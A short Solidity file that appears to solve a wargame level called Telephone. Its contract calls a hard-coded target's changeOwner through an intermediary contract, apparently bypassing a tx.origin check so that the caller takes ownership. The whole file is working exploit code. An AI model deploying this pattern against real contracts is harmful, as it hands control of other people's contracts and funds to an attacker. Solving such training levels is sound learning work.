// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

abstract contract TelephoneInterface {
    function changeOwner(address _owner) virtual public;
}

contract TelephoneAttack{
    address TelephoneAddress =  0x18fF1e7a9dc170D3BeE7348C257E55DB9E36D5d3;
    TelephoneInterface telephoneContract = TelephoneInterface(TelephoneAddress);

    function changeOwnerAttack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}